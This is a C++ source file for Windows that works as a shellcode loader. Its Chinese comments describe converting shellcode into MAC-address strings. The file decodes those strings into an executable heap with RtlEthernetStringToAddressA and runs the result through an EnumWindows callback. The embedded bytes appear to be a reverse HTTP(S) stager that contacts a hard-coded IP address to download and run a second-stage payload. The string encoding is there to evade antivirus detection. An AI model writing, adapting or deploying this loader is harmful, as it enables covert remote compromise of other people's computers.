#include <Windows.h>
#include <iostream>
#include <ip2string.h>
#pragma comment(lib, "Ntdll.lib")


//将转换后的shellcode（shellcode-> mac）
const char* mac_[] =
{
    "FC-48-83-E4-F0-E8", "C8-00-00-00-41-51", "41-50-52-51-56-48", "31-D2-65-48-8B-52", "60-48-8B-52-18-48", "8B-52-20-48-8B-72", "50-48-0F-B7-4A-4A", "4D-31-C9-48-31-C0", "AC-3C-61-7C-02-2C", "20-41-C1-C9-0D-41", "01-C1-E2-ED-52-41", "51-48-8B-52-20-8B", "42-3C-48-01-D0-66", "81-78-18-0B-02-75", "72-8B-80-88-00-00", "00-48-85-C0-74-67", "48-01-D0-50-8B-48", "18-44-8B-40-20-49", "01-D0-E3-56-48-FF", "C9-41-8B-34-88-48", "01-D6-4D-31-C9-48", "31-C0-AC-41-C1-C9", "0D-41-01-C1-38-E0", "75-F1-4C-03-4C-24", "08-45-39-D1-75-D8", "58-44-8B-40-24-49", "01-D0-66-41-8B-0C", "48-44-8B-40-1C-49", "01-D0-41-8B-04-88", "48-01-D0-41-58-41", "58-5E-59-5A-41-58", "41-59-41-5A-48-83", "EC-20-41-52-FF-E0", "58-41-59-5A-48-8B", "12-E9-4F-FF-FF-FF", "5D-6A-00-49-BE-77", "69-6E-69-6E-65-74", "00-41-56-49-89-E6", "4C-89-F1-41-BA-4C", "77-26-07-FF-D5-48", "31-C9-48-31-D2-4D", "31-C0-4D-31-C9-41", "50-41-50-41-BA-3A", "56-79-A7-FF-D5-E9", "93-00-00-00-5A-48", "89-C1-41-B8-BB-01", "00-00-4D-31-C9-41", "51-41-51-6A-03-41", "51-41-BA-57-89-9F", "C6-FF-D5-EB-79-5B", "48-89-C1-48-31-D2", "49-89-D8-4D-31-C9", "52-68-00-32-C0-84", "52-52-41-BA-EB-55", "2E-3B-FF-D5-48-89", "C6-48-83-C3-50-6A", "0A-5F-48-89-F1-BA", "1F-00-00-00-6A-00", "68-80-33-00-00-49", "89-E0-41-B9-04-00", "00-00-41-BA-75-46", "9E-86-FF-D5-48-89", "F1-48-89-DA-49-C7", "C0-FF-FF-FF-FF-4D", "31-C9-52-52-41-BA", "2D-06-18-7B-FF-D5", "85-C0-0F-85-9D-01", "00-00-48-FF-CF-0F", "84-8C-01-00-00-EB", "B3-E9-E4-01-00-00", "E8-82-FF-FF-FF-2F", "4C-79-32-66-00-16", "18-19-7F-CF-26-02", "0C-F1-94-1A-0A-74", "B2-E1-19-FD-FD-5F", "ED-E6-21-DE-CD-E3", "2C-0E-C7-64-B2-38", "B4-66-03-BB-E5-74", "99-A5-4B-97-A9-63", "91-01-65-05-7C-94", "A1-E9-26-87-59-70", "DA-68-E2-5F-F8-23", "DE-25-99-F9-62-EF", "5F-61-F1-32-FD-AB", "00-55-73-65-72-2D", "41-67-65-6E-74-3A", "20-4D-6F-7A-69-6C", "6C-61-2F-35-2E-30", "20-28-63-6F-6D-70", "61-74-69-62-6C-65", "3B-20-4D-53-49-45", "20-39-2E-30-3B-20", "71-64-65-73-6B-20", "32-2E-34-2E-31-32", "36-33-2E-32-30-33", "3B-20-57-69-6E-64", "6F-77-73-20-4E-54", "20-36-2E-31-3B-20", "57-4F-57-36-34-3B", "20-54-72-69-64-65", "6E-74-2F-35-2E-30", "29-0D-0A-00-7D-0A", "12-0C-48-A8-65-A9", "66-BA-CA-2F-81-DB", "C5-30-DB-66-81-E7", "FB-7C-18-4E-81-BA", "3D-D0-33-80-49-DF", "04-DB-34-B2-32-C6", "A2-0D-41-D7-93-CD", "7D-9D-D9-43-86-5C", "72-66-16-E8-44-95", "9F-83-63-CE-2F-D1", "B1-99-E6-CE-C9-D6", "A7-6C-6D-40-22-5C", "38-C6-4F-DE-3A-83", "84-72-F9-1A-95-3B", "53-53-C8-71-EA-07", "BA-9E-98-A6-6D-37", "D5-FA-3B-B6-25-5F", "48-3B-68-52-1E-AB", "44-CB-33-3D-A1-44", "8F-58-48-F0-54-D9", "A5-5A-1D-04-A5-28", "9B-E5-C3-7A-36-13", "1C-11-CB-55-F9-BD", "7A-EC-CE-6C-87-E5", "94-09-44-F4-6F-06", "B9-0F-DF-BF-CC-28", "7B-10-1D-86-4A-D6", "A7-F2-EC-21-D7-FA", "1C-00-54-6A-3B-C8", "62-C5-A1-DE-80-1C", "D3-44-B3-88-F8-A9", "BD-F8-AB-BA-8B-42", "84-9E-A2-71-00-41", "BE-F0-B5-A2-56-FF", "D5-48-31-C9-BA-00", "00-40-00-41-B8-00", "10-00-00-41-B9-40", "00-00-00-41-BA-58", "A4-53-E5-FF-D5-48", "93-53-53-48-89-E7", "48-89-F1-48-89-DA", "41-B8-00-20-00-00", "49-89-F9-41-BA-12", "96-89-E2-FF-D5-48", "83-C4-20-85-C0-74", "B6-66-8B-07-48-01", "C3-85-C0-75-D7-58", "58-58-48-05-00-00", "00-00-50-C3-E8-7F", "FD-FF-FF-31-2E-31", "35-2E-38-30-2E-31", "30-32-00-49-96-02", "D2-00-00-00-00-00"

};


int main()
{
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);//在进程的虚拟地址空间中保留空间
    void* ha = HeapAlloc(hc, 0, 0x100000);//申请内存
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(mac_) / sizeof(mac_[0]);
    PCSTR Terminator = "";

    for (int i = 0; i < elems; i++) {

        if (RtlEthernetStringToAddressA(mac_[i],  &Terminator, (DL_EUI48*)hptr) == STATUS_INVALID_PARAMETER)
        {
            printf("ERROR!");
            return 0;
        }
        hptr += 6;
    }

    // EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    // EnumTimeFormatsA((TIMEFMT_ENUMPROCA)ha, 0, 0);
    EnumWindows((WNDENUMPROC)ha, 0);
    // EnumDesktopWindows(NULL,(WNDENUMPROC)ha, 0);
    // EnumThreadWindows(0, (WNDENUMPROC)ha, 0);
    // EnumSystemGeoID(0, 0, (GEO_ENUMPROC)ha);
    // EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)ha, 0, 0);
    // EnumUILanguagesA((UILANGUAGE_ENUMPROCA)ha, 0, 0);
    // EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)ha, 0);
    // EnumDesktopsW(NULL,(DESKTOPENUMPROCW)ha, NULL);
    // EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)ha, 0);
    // EnumDateFormatsA((DATEFMT_ENUMPROCA)ha, 0, 0);
    // EnumChildWindows(NULL, (WNDENUMPROC)ha, 0);
    // CloseHandle(ha);
    return 0;
}
